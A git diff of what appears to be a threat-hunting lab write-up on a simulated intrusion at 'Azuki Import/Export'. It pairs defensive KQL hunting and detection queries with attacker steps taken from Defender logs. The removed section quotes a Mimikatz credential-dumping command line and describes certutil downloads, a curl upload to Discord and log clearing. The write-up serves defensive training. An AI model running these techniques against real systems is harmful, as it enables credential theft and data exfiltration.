@@ -1,669 +1,1302 @@
-<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/09b44f4a-1670-4804-8009-5287751e7e8d" />
+<p align="center">
+  <img
+    src="https://github.com/user-attachments/assets/91a89840-4446-4ad4-a020-94d57c079f47"
+    alt="image"
+    width="518"
+    height="777"
+  />
+</p>
 
-# 🕵️‍♀️ Threat Hunt Report: **Port of Entry**
-INCIDENT BRIEF - Azuki Import/Export - 梓貿易株式会社 
-<br>
-SITUATION: Competitor undercut our 6-year shipping contract by exactly 3%. Our supplier contracts and pricing data appeared on underground forums.
-<br>
-COMPANY: Azuki Import/Export Trading Co. - 23 employees, shipping logistics Japan/SE Asia
-<br>
-EVIDENCE AVAILABLE: Microsoft Defender for Endpoint logs
-<br>
-Analyst: Jr Buggs
-<br>
-Date Completed: 04/22/2026
-<br>
-Environment Investigated: 
-Azure Logs via Microsoft Defender
-<br>
-Timeframe: 11/20/2025
-<br>
-## 🧠 Scenario Overview
 
-Competitor undercut our 6-year shipping contract by exactly 3%. Our supplier contracts and pricing data appeared on underground forums.
+<br>
+<br>
+# INCIDENT BRIEF - Cargo Hold -Azuki Import/Export - 梓貿易株式会社
+
+**📋 INCIDENT BRIEF**
+
+**SITUATION**  
+After establishing initial access on **November 19th**, network monitoring detected the attacker returning approximately **72 hours later**. Suspicious lateral movement and large data transfers were observed overnight on the file server.
+
+**COMPROMISED SYSTEMS**  
+[REDACTED - Investigation Required]
+
+**EVIDENCE AVAILABLE**  
+Microsoft Defender for Endpoint logs
+
+**Query Starting Point**
+```kql
+DeviceLogonEvents
+| where DeviceName contains "azuki"
+```
+<br>
+<br>
+
+<details>
+<summary><strong>📚 Table of Contents</strong></summary>
+
+- [Hunt Overview](#hunt-overview)
+
+- [🚩 Flag #1: Initial Access](#flag-1)
+- [🚩 Flag #2: Lateral Movement](#flag-2)
+- [🚩 Flag #3: Valid Accounts Abuse](#flag-3)
+- [🚩 Flag #4: Share Discovery](#flag-4)
+- [🚩 Flag #5: Remote Share Discovery](#flag-5)
+- [🚩 Flag #6: Privilege & Group Discovery](#flag-6)
+- [🚩 Flag #7: Network Discovery](#flag-7)
+- [🚩 Flag #8: Defense Evasion](#flag-8)
+- [🚩 Flag #9: Data Staging](#flag-9)
+- [🚩 Flag #10: LOLBIN Download](#flag-10)
+- [🚩 Flag #11: Credential Discovery](#flag-11)
+- [🚩 Flag #12: Bulk Data Collection](#flag-12)
+- [🚩 Flag #13: Data Compression](#flag-13)
+- [🚩 Flag #14: Tool Masquerading](#flag-14)
+- [🚩 Flag #15: LSASS Memory Dump](#flag-15)
+- [🚩 Flag #16: Data Exfiltration](#flag-16)
+- [🚩 Flag #17: Cloud Exfiltration](#flag-17)
+- [🚩 Flag #18: Registry Persistence](#flag-18)
+- [🚩 Flag #19: Beacon Filename](#flag-19)
+- [🚩 Flag #20: History File Deletion](#flag-20)
+
+- [High-Level Summary](#high-level-summary)
+
+</details>
+
+
+<br>
+<br>
+
+
+## Hunt Overview
+
+This hunt documents a full post-compromise intrusion lifecycle on a Windows server, beginning with valid account abuse and lateral movement, progressing through credential access, bulk data collection, and exfiltration, and concluding with persistence and anti-forensic cleanup. The activity demonstrates deliberate attacker tradecraft aligned with multiple high-confidence MITRE ATT&CK techniques.
+
+| Flag | Technique Category            | MITRE ID     | Priority |
+|------|------------------------------|--------------|----------|
+| 1    | Initial Access (Return)      | T1078        | Critical |
+| 2    | Lateral Movement (RDP)       | T1021.001    | Critical |
+| 3    | Valid Account Abuse          | T1078        | Critical |
+| 4    | Share Discovery              | T1135        | High     |
+| 5    | Remote Share Discovery       | T1135        | High     |
+| 6    | Privilege Discovery          | T1033 / T1069| High     |
+| 7    | Network Discovery            | T1016        | Medium   |
+| 8    | Defense Evasion (Hidden Files)| T1564.001   | High     |
+| 9    | Data Staging                 | T1074.001    | Critical |
+| 10   | LOLBIN Download              | T1105        | Critical |
+| 11   | Credential Discovery         | T1552.001    | Critical |
+| 12   | Bulk Data Collection         | T1074.001    | Critical |
+| 13   | Data Compression             | T1560.001    | High     |
+| 14   | Tool Masquerading            | T1036        | High     |
+| 15   | LSASS Memory Dump             | T1003.001    | Critical |
+| 16   | Data Exfiltration (HTTP)     | T1048.003    | Critical |
+| 17   | Cloud Exfiltration           | T1567.002    | Critical |
+| 18   | Persistence (Registry Run Key)| T1547.001   | High     |
+| 19   | Persistence (Masqueraded Beacon)| T1036    | High     |
+| 20   | Anti-Forensics (History Deletion)| T1070.003 | High     |
 
 ---
 
+<br>
+<br>
+<a id="flag-1"></a>
+### 🚩 Flag 1: INITIAL ACCESS - Return Connection Source
 
-## Chronological Timeline of Compromise
+**🎯 Objective**  
+After establishing initial access, sophisticated attackers often wait hours or days (dwell time) before continuing operations. They may rotate infrastructure between sessions to avoid detection.
 
-All events occurred on host **azuki-sl** on **November 20, 2025** (timestamps approximate in UTC/local as shown in logs; primary activity between ~01:37 AM and ~02:11 AM).
+**📌 Finding**  
+159.26.106.98
 
-| **Time (approx.)**       | **Flag** | **Action Observed**                          | **Key Evidence**                                                                 |
-|--------------------------|----------|----------------------------------------------|----------------------------------------------------------------------------------|
-| 2025-11-20 01:37 AM      | Flag 18  | Execution - Malicious Script                 | PowerShell script wupdate.ps1 executed to initiate attack chain                  |
-| 2025-11-20 01:37 AM      | Flag 10  | Command & Control - Initial Beacon           | Outbound connection from malicious process (svchost.exe) to C2 IP 78.141.196.6 on port 443 |
-| 2025-11-20 ~02:05 AM     | Flag 4   | Defense Evasion - Malware Staging Directory  | Creation of hidden directory C:\ProgramData\WindowsCache                         |
-| 2025-11-20 02:06 AM      | Flag 7   | Defense Evasion - Download Utility Abuse     | certutil.exe used to download malicious payload                                  |
-| 2025-11-20 02:07 AM      | Flag 12  | Credential Access - Credential Theft Tool    | Download and staging of renamed Mimikatz executable mm.exe                       |
-| 2025-11-20 02:07 AM      | Flag 8   | Persistence - Scheduled Task Creation        | Scheduled task "Windows Update Check" created                                    |
-| 2025-11-20 02:07 AM      | Flag 9   | Persistence - Scheduled Task Target          | Task configured to execute C:\ProgramData\WindowsCache\svchost.exe               |
-| 2025-11-20 02:08 AM      | Flag 13  | Credential Access - Memory Extraction        | mm.exe executed with "privilege::debug sekurlsa::logonpasswords exit"            |
-| 2025-11-20 ~02:08 AM     | Flag 14  | Collection - Data Staging Archive            | Creation of export-data.zip (and other .zip files like VMAgentLogs.zip) in staging directory |
-| 2025-11-20 02:09 AM      | Flag 15  | Exfiltration - Exfiltration Channel          | curl.exe used to upload export-data.zip via HTTPS to Discord                     |
-| 2025-11-20 02:10 AM      | Flag 19  | Lateral Movement - Secondary Target          | RDP connection attempted to internal IP 10.1.0.188                               |
-| 2025-11-20 02:10 AM      | Flag 20  | Lateral Movement - Remote Access Tool        | mstsc.exe launched for remote desktop to 10.1.0.188                              |
-| 2025-11-20 02:11 AM      | Flag 16  | Anti-Forensics - Log Tampering               | wevtutil.exe used to clear Security log (and possibly others)                    |
-| 2025-11-20 (post-activity)| Flag 17 | Impact - Persistence Account                 | Hidden local administrator account "support" created and added to Administrators group |
-| 2025-11-18 to 2025-11-21 | Flag 1   | Initial Access - Remote Access Source        | RDP connection from external IP 88.97.178.12                                     |
-| 2025-11-18 to 2025-11-21 | Flag 2   | Initial Access - Compromised User Account    | Successful logon using account kenji.sato                                        |
-| 2025-11-19 to 2025-11-21 | Flag 3   | Discovery - Network Reconnaissance           | arp -a executed to enumerate local network                                       |
-| 2025-11-19 to 2025-11-21 | Flag 5   | Defense Evasion - File Extension Exclusions  | 3 file extensions added to Windows Defender exclusions                           |
-| 2025-11-19 to 2025-11-21 | Flag 6   | Defense Evasion - Temporary Folder Exclusion | Exclusion added for Temp folder                                                  |
-| 2025-11-19 to 2025-11-21 | Flag 11  | Command & Control - C2 Communication Port     | Persistent C2 traffic over port 443                                              |
+**🔍 Evidence**
+
+| Field            | Value                            |
+|------------------|----------------------------------|
+| Device Name      | azuki-sl                         |
+| Timestamp        | Nov 22, 2025 7:27:53 AM          |
+| Action Type      | LogonSuccess                     |
 
 
-### Starting Point – 
-DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
+**💡 Why it matters**  
+The IP address discovered is the new source the attacker used when returning approximately 72 hours after the initial compromise.
+Sophisticated adversaries commonly rotate infrastructure between sessions to avoid linking new activity to the original breach and to evade detection based on known-bad IPs.
+Identifying this different return IP confirms the attacker has maintained access, exercised patience (dwell time), and is now escalating the intrusion (MITRE ATT&CK TA0001 – Initial Access sustained via T1078 – Valid Accounts).
 
-**Identified System:**
-azuki-sl 
-
-
-### 🪪 Flag 1 – INITIAL ACCESS - Remote Access Source
-
-**Objective:**
-Remote Desktop Protocol connections leave network traces that identify the source of unauthorised access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.
-
-**What to Hunt:**
-Query logon events for interactive sessions from external sources during the incident timeframe.
-
-**Identified Activity:**
-88.97.178.12 is the source IP address of the Remote Desktop Protocol Connection
-
-**Why It Matters:**
-The IP 88.97.178.12 is the external address the attacker used to connect via Remote Desktop Protocol (RDP). Pinpointing this source gives defenders a clear starting point: they can block the IP at the firewall, check threat intel to see if it’s linked to known actors or proxy services, and correlate it with other incidents. Knowing the exact entry vector speeds up containment and helps answer “who might be behind this?” (MITRE ATT&CK T1133 – External Remote Services).
-
-**KQL Query Used:**
+**🔧 KQL Query Used**
 ```
 DeviceLogonEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-21))
-| where RemoteIP contains "."
-| where ActionType == "LogonSuccess"
-| project Timestamp, ActionType, AccountName,  RemoteIP, RemoteIPType, RemoteDeviceName
-| order by Timestamp asc
+| where DeviceName contains "azuki" 
+| where Timestamp between (startofday(datetime(2025-11-22)) .. endofday(datetime(2025-11-24)))
+| where isnotempty(RemoteIP)
+| where ActionType contains "success"
+| project Timestamp, DeviceId, DeviceName, ActionType, InitiatingProcessRemoteSessionIP, RemoteIP
 ```
-<img width="1739" height="382" alt="image" src="https://github.com/user-attachments/assets/0a155b6a-d56c-477c-9cf5-6f8f08e15e52" />
+**🖼️ Screenshot**
+<img width="1704" height="668" alt="image" src="https://github.com/user-attachments/assets/ec26dcb6-667d-4b6c-a444-e7159bc1c784" />
 
-
-
-### 🛰️ Flag 2 – INITIAL ACCESS - Compromised User Account
-
-**Objective:**
-Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts, including password resets and privilege reviews.
-
-**What to Hunt:**
-Focus on the account that authenticated during the suspicious remote access session. Cross-reference the logon event timestamp with the external IP connection.
-
-**Identified User Account:**
-kenji.sato
-
-**Why It Matters:**
-The account kenji.sato was the valid credential the attacker used to log in successfully. This reveals the initial foothold: defenders can immediately disable or reset the account, investigate how the password was obtained (phishing, reuse from a breach, etc.), and check for similar compromises across the organization. Using legitimate accounts lets attackers blend in, making this a critical indicator of credential compromise (MITRE ATT&CK T1078 – Valid Accounts).
-
-**KQL Query Used**
+**🛠️ A.I. Detection Recommendation**
 ```
 DeviceLogonEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-21))
-| where RemoteIP contains "."
-| where ActionType == "LogonSuccess"
-| project Timestamp, ActionType, AccountName,  RemoteIP, RemoteIPType, RemoteDeviceName
-| order by Timestamp asc
+| where TimeGenerated > ago(30d)                          // Adjust window as needed (e.g., last 30 days)
+| where isnotempty(RemoteIP)                              // Only remote logons with a real IP
+| where LogonType in ("RemoteInteractive", "Network")     // Focus on RDP and network logons (common for attackers)
+| where AccountName !contains "$"                         // Exclude machine accounts (optional – reduces noise)
+| summarize LogonCount = count(), FirstLogon = min(TimeGenerated), LastLogon = max(TimeGenerated) by DeviceName, AccountName, RemoteIP
+| where LogonCount >= 1                                    // Or raise threshold if needed
+| order by LastLogon desc
 ```
-<img width="1739" height="382" alt="image" src="https://github.com/user-attachments/assets/346167c5-d6b6-4374-a139-d1db62b494b6" />
 
+<br>
+<hr>
+<br>
+<br>
+<br>
+<a id="flag-2"></a>
+### 🚩 Flag 2: LATERAL MOVEMENT - Compromised Device
+**🎯 Objective**  
+Lateral movement targets are selected based on their access to sensitive data or network privileges. File servers are high-value targets containing business-critical information.
 
+**📌 Finding**  
+azuki-fileserver01
 
-### 📄 Flag 3 – DISCOVERY - Network Reconnaissance
+**🔍 Evidence**
 
-**Objective:**
-Look for commands that reveal local network devices and their hardware addresses.
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-sl                          |
+| Timestamp        | Nov 22, 2025 7:38:47 AM              |
+| Process          | Microsoft Remote Desktop Connection                  |
+| Parent Process   | powershell.exe                    |
+| Command Line     | `"mstsc.exe" /V:10.1.0.188 `                 |
 
-**What to Hunt:**
-Look for file access involving keywords like board, financial, or crypto — especially in user folders. Check DeviceProcessEvents for network enumeration utilities executed after initial access.
+**💡 Why it matters**  
+The command "mstsc.exe" /v:10.1.0.188 shows someone launching Remote Desktop to connect to the machine at IP 10.1.0.188.
+In a compromised environment, this is a clear sign the attacker is using stolen credentials to move laterally — jumping from the machine they already control to a new target inside the network via RDP.
+Finding this event reveals the attacker’s next target and confirms active hands-on-keyboard movement, a critical escalation step in most real-world breaches (MITRE ATT&CK T1021.001 – Remote Desktop Protocol).
 
-**Identified Command:**
-"ARP.EXE" -a
-
-**Why It Matters:**
-Running arp -a maps out nearby devices on the local network, giving the attacker a picture of potential next targets. Spotting this early reconnaissance shows the attacker is actively exploring the environment and planning lateral movement, allowing defenders to anticipate and monitor those systems before deeper access occurs (MITRE ATT&CK T1018 – Remote System Discovery).
-
-**KQL Query Used:**
+**🔧 KQL Query Used**
 ```
 DeviceProcessEvents
-| where DeviceName == "azuki-sl"
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| project Timestamp, DeviceName, ProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki-sl"
+| where ProcessCommandLine contains "mstsc.exe"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine
 ```
-<img width="1709" height="488" alt="image" src="https://github.com/user-attachments/assets/2321e140-cf3b-4c28-ae5a-91a90feb3a6c" />
+**🖼️ Screenshot**
+
+<img width="1710" height="305" alt="image" src="https://github.com/user-attachments/assets/60033488-393f-4f7d-9964-cd614eade49b" />
+<br>
+<img width="577" height="790" alt="image" src="https://github.com/user-attachments/assets/6f315126-7c0f-4824-81ad-4a4d062e8dd8" />
+
+
+**🛠️ A.I. Detection Recommendation**
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)                          // Adjust time window as needed
+| where FileName == "mstsc.exe"                           // Focus on Remote Desktop client launches
+| where ProcessCommandLine contains "/v:"                // Look for the /v switch specifying a target
+| extend Target = extract(@"/v:([^ ]+)", 1, ProcessCommandLine)  // Extract the target IP/hostname
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, Target, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+
+<br>
+<hr>
+<br>
+<br>
+<br>
+<a id="flag-3"></a>
+### 🚩 Flag 3: LATERAL MOVEMENT - Compromised Account
+**🎯 Objective**  
+Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts.
+
+**📌 Finding**  
+fileadmin
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                         |
+| Timestamp        | Nov 22, 2025 7:38:49 AM                    |
+| Action Type      | Logon Success                              |
+| Remote IP        | 10.1.0.204                                 |
+
+
+**💡 Why it matters**  
+Finding the exact compromised account is essential because it shows the full scope of what the attacker can reach — in this case, sensitive files and shares that a file-server admin would normally access.
+Knowing the compromised account enables immediate containment (disable/reset the account) and guides the rest of the investigation and remediation (MITRE ATT&CK T1078 – Valid Accounts used for lateral movement and data access).
+
+**🔧 KQL Query Used**
+```
+DeviceLogonEvents
+| where RemoteDeviceName contains "azuki" 
+| where Timestamp between (startofday(datetime(2025-11-22)) .. endofday(datetime(2025-11-22)))
+| project Timestamp, DeviceId, DeviceName, ActionType, InitiatingProcessRemoteSessionIP, RemoteIP
+```
+**🖼️ Screenshot**
+[Your screenshot here]
+<img width="1743" height="221" alt="image" src="https://github.com/user-attachments/assets/0ad57116-8296-4a9d-9c87-e749acd0d84d" />
+
+<br>
+
+<img width="642" height="166" alt="image" src="https://github.com/user-attachments/assets/4021b519-fabe-4754-b5d6-af94ada9120b" />
+
+
+**🛠️ Detection Recommendation**
+```
+DeviceLogonEvents
+| where TimeGenerated > ago(30d)                          // Adjust time window as needed
+| where isnotempty(RemoteIP)                              // Only remote logons
+| where LogonType in ("RemoteInteractive", "Network")     // RDP or network logons (common for lateral movement)
+| where AccountName !contains "$"                         // Exclude machine accounts (optional noise reduction)
+| summarize LogonCount = count(), 
+            FirstSeen = min(TimeGenerated), 
+            LastSeen = max(TimeGenerated), 
+            Devices = make_set(DeviceName) by AccountName, RemoteIP
+| where LogonCount >= 2                                   // Find accounts with multiple logons from the same remote IP
+| order by LogonCount desc
+```
+
+<br>
+<hr>
+<br>
+<br>
+<br>
+<a id="flag-4"></a>
+### 🚩 Flag 4: DISCOVERY - Share Enumeration Command
+**🎯 Objective**  
+Network share enumeration reveals available data repositories and helps attackers identify targets for collection and exfiltration.
+
+**📌 Finding**  
+"net.exe" share
+
+**🔍 Evidence**
+
+| Field            | Value                                     |
+|------------------|-------------------------------------------|
+| Host             | azuki-fileserver01                        |
+| Timestamp        | Nov 22, 2025 7:40:54 AM                   |
+| Process          |      net.exe                              |
+| Parent Process   | powershell.exe                            |
+| Command Line     | `"net.exe" share   `                      |
+
+**💡 Why it matters**  
+The attacker ran a command to list all visible network shares from the compromised machine.
+This simple action instantly shows them which servers and workstations are sharing folders — and, more importantly, which ones their current stolen account can actually reach.
+Finding accessible shares is a critical step for attackers because those folders often contain the most valuable data (finance, HR, backups, databases) and become the primary targets for collection and exfiltration (MITRE ATT&CK T1135 – Network Share Discovery). Spotting this early tells us the attacker is actively mapping the network for high-value data locations.
+
+**🔧 KQL Query Used**
+```
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "net"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+```
+**🖼️ Screenshot**
+<img width="1785" height="727" alt="image" src="https://github.com/user-attachments/assets/1c0c90ca-33bb-4034-81d2-4c21ab424e2c" />
+
+
+**🛠️ Detection Recommendation**
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)                          // Adjust time window as needed
+| where FileName in ("net.exe", "powershell.exe", "cmd.exe")  // Common processes used for share discovery
+| where ProcessCommandLine has_any("net view", "net share", "Get-SmbShare", "win32_share", "wmic share")
+| extend Target = extract(@"\\\\([^\\]+)", 1, ProcessCommandLine)  // Extracts potential target hostname if present
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, FileName, Target, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+<br>
+<hr>
+<br>
+<a id="flag-5"></a>
+### 🚩 Flag #5: DISCOVERY - Remote Share Enumeration
+**🎯 Objective**  
+Attackers enumerate remote network shares to identify accessible file servers and data repositories across the network.
+
+**📌 Finding**  
+"net.exe" view \\10.1.0.188
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                         |
+| Timestamp        | Nov 22, 2025 7:42:01 AM                    |
+| Process          | net.exe                                    |
+| Parent Process   | powershell.exe                             |
+| Command Line     | `net.exe" view \\10.1.0.188`               |
+
+**💡 Why it matters**  
+The attacker ran a command to list network shares on a remote machine (not just the local one), revealing which folders and files on other servers they can actually access with their current stolen credentials.
+This step is crucial because it helps the attacker quickly locate high-value data repositories — such as file servers holding finance, HR, or customer files — that are often the ultimate target for exfiltration or encryption.
+Detecting remote share enumeration early signals that the attacker has moved beyond basic recon and is actively hunting for data across the network (MITRE ATT&CK T1135 – Network Share Discovery).
+
+**🔧 KQL Query Used**
+```
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "\\"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
+```
+**🖼️ Screenshot**
+<img width="1665" height="597" alt="image" src="https://github.com/user-attachments/assets/929005b2-7623-404a-861c-f511c4537d9b" />
+
+
+**🛠️ Detection Recommendation**
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)                          // Adjust time window as needed
+| where FileName in ("net.exe", "cmd.exe", "powershell.exe")
+| where ProcessCommandLine has_any("net view \\\\", "net use \\\\", "Get-SmbMapping", "Invoke-Command -ComputerName")
+| extend RemoteTarget = extract(@"\\\\([^\\ ]+)", 1, ProcessCommandLine)  // Extracts the remote hostname/server queried
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, RemoteTarget, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
 
 
 
-### ⏱️ Flag 4 – DEFENCE EVASION - Malware Staging Directory
+<br>
+<hr>
+<br>
 
-**Objective:**
-Attackers establish staging locations to organise tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.
+<a id="flag-6"></a>
+### 🚩 Flag #6: DISCOVERY - Privilege Enumeration
+**🎯 Objective**  
+Understanding current user privileges and group memberships helps attackers determine what actions they can perform and whether privilege escalation is needed.
 
-**What to Hunt:**
-Search for newly created directories in system folders that were subsequently hidden from normal view. Look for mkdir or New-Item commands followed by attrib commands that modify folder attributes.
+**📌 Finding**  
+"whoami.exe" /all
 
-**PRIMARY Staging Directory Found:**
-C:\ProgramData\WindowsCache
-Nov 20, 2025 2:05:30 AM
+**🔍 Evidence**
 
-**Why It Matters:**
-Creating C:\ProgramData\WindowsCache as a hidden staging folder lets the attacker store tools in a location that looks semi-legitimate and isn’t routinely checked. Identifying these non-standard directories reveals where payloads are hidden and helps build detection rules for unusual folder creation in system paths (MITRE ATT&CK T1564 – Hide Artifacts).
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                         |
+| Timestamp        | 2025-11-22T00:42:24.1217046Z               |
+| Process          | whoami.exe                     |
+| Parent Process   | "powershell.exe                      |
+| Command Line     | `"whoami.exe" /all`                 |
+
+**💡 Why it matters**  
+Running whoami.exe /all is a high-signal discovery action that reveals the attacker’s effective privileges, group memberships, token elevation status, and assigned rights under the current session. This information allows an attacker to immediately assess whether they already have administrative or delegated access, or whether privilege escalation is required before proceeding. 
+
+In real-world intrusions, this step often precedes credential abuse, lateral movement, or direct access to sensitive systems when elevated roles (e.g., Domain Users with special rights, local administrators, backup operators) are discovered. 
+
+The use of this command via PowerShell strongly aligns with MITRE ATT&CK T1033 – System Owner/User Discovery and T1069 – Permission Group Discovery. Because it provides rapid confirmation of attack feasibility with minimal noise, whoami /all is commonly observed in hands-on-keyboard activity and is a reliable indicator of interactive attacker presence, not automated background activity.
+
+**🔧 KQL Query Used** (filter "whoami")
+```
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
+```
+**🖼️ Screenshot**
+<img width="1505" height="629" alt="image" src="https://github.com/user-attachments/assets/65486d2d-e43f-4ff1-b2f0-1070a4263538" />
 
 
-**KQL Query Used:**
+**🛠️ Detection Recommendation**
+<br>
+***Hunting tip:***
+Prioritize results where the initiating process is powershell.exe, the account is non-IT or service-based, or the activity occurs shortly after initial access or lateral movement events.
+<br>
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)   // Tune for hunt scope
+| where FileName in ("whoami.exe", "cmd.exe", "powershell.exe")
+| where ProcessCommandLine has_any(
+    "whoami /all",
+    "whoami /groups",
+    "whoami /priv",
+    "Get-LocalGroup",
+    "Get-LocalGroupMember",
+    "net localgroup",
+    "net user"
+)
+| project
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    FileName,
+    ProcessCommandLine,
+    InitiatingProcessCommandLine,
+    InitiatingProcessAccountName
+| order by TimeGenerated desc
+```
+
+
+<br>
+<hr>
+<br>
+<a id="flag-7"></a>
+### 🚩 Flag #7: DISCOVERY - Network Configuration Command
+**🎯 Objective**  
+Network configuration enumeration helps attackers understand the target environment, identify domain membership, and discover additional network segments.
+
+**📌 Finding**  
+"ipconfig.exe" /all
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                         |
+| Timestamp        | 2025-11-22T00:42:46.3655894Z               |
+| Process          | ipconfig.exe                     |
+| Parent Process   | "powershell.exe"                       |
+| Command Line     | `"ipconfig.exe" /all`                 |
+
+**💡 Why it matters**  
+Running ipconfig /all provides attackers with detailed insight into the host’s network configuration, including IP addresses, DNS servers, default gateways, and domain membership. This information helps determine whether the system is domain-joined, identify internal DNS infrastructure, and reveal additional network segments that may be reachable. 
+
+In real-world intrusions, this command is commonly executed immediately after initial access to orient the attacker within the environment. When observed alongside other discovery activity, it strongly indicates hands-on-keyboard reconnaissance rather than benign automation. 
+
+This behavior maps to MITRE ATT&CK T1016 – System Network Configuration Discovery and is a reliable early-stage signal of active adversary presence.
+
+**🔧 KQL Query Used**
+```
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
+```
+**🖼️ Screenshot**
+<img width="1499" height="630" alt="image" src="https://github.com/user-attachments/assets/e68c218e-8f6c-4291-b1f8-1109e75b5e36" />
+
+**🛠️ Detection Recommendation**
+<br>
+***Hunting Tip***
+
+Prioritize results where network enumeration commands are executed shortly after process launch from powershell.exe or cmd.exe, especially on servers or non-workstation hosts. Chaining this activity with subsequent share discovery or credential access events often reveals a clear attacker reconnaissance sequence.
+<br>
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d) 
+| where FileName in ("ipconfig.exe", "cmd.exe", "powershell.exe")
+| where ProcessCommandLine has_any("ipconfig /all", "ipconfig.exe /all", "Get-NetIPConfiguration", "Get-NetAdapter")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+
+```
+
+
+<br>
+<hr>
+<br>
+<a id="flag-8"></a>
+### 🚩 Flag #8: DEFENSE EVASION - Directory Hiding Command
+**🎯 Objective**  
+Modifying file system attributes to hide directories prevents casual discovery by users and some security tools. Document the exact command line used.
+
+**📌 Finding**  
+"attrib.exe" +h +s C:\Windows\Logs\CBS
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                         |
+| Timestamp        | 2025-11-22T00:55:43.9986049Z              |
+| Process          | attrib.exe                  |
+| Parent Process   | powershell.exe                       |
+| Command Line     | `attrib.exe" +h +s C:\Windows\Logs\CBS`                 |
+
+**💡 Why it matters**  
+Setting hidden (+h) and system (+s) attributes on directories is a common defense evasion technique used to conceal attacker artifacts from users, administrators, and basic file browsing tools. By hiding a directory under a trusted Windows path (C:\Windows\Logs\CBS), the attacker blends malicious or staging content into locations that are rarely scrutinized. 
+
+This behavior strongly maps to MITRE ATT&CK T1564.001 – Hide Artifacts: Hidden Files and Directories. While administrators may occasionally use attrib.exe, its execution from a scripting engine such as PowerShell significantly raises the signal. When observed alongside other discovery or persistence activity, this action often indicates post-compromise cleanup or preparation for longer-term access.
+
+**🔧 KQL Query Used**
+```
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has_any ("{", "[", "+", "|") 
+| where InitiatingProcessFileName == "powershell.exe"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
+```
+**🖼️ Screenshot**
+<img width="1528" height="745" alt="image" src="https://github.com/user-attachments/assets/ffed7bd7-b192-41fc-b10a-8a75131315bf" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Use this query to hunt for attempts to hide files or directories using attribute modification, especially when initiated by scripting engines or non-interactive processes. Prioritize results on servers and shared systems, and look for attribute changes applied to system paths or uncommon directories. Correlate findings with prior discovery, credential access, or persistence activity to identify stealthy post-exploitation behavior.
+
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where FileName == "attrib.exe"
+| where ProcessCommandLine has_any("+h", "+s")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe")
+| extend TargetPath = extract(@"([A-Z]:\\[^ ]+)", 1, ProcessCommandLine)
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, TargetPath, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+
+
+<br>
+<hr>
+<br>
+
+<a id="flag-9"></a>
+### 🚩 Flag #9: COLLECTION - Staging Directory Path
+**🎯 Objective**  
+Attackers establish staging locations to organise tools and stolen data before exfiltration. This directory path is a critical IOC.
+
+**📌 Finding**  
+C:\Windows\Logs\CBS
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                          |
+| Timestamp        | 2025-11-22T00:55:43.9986049Z             |
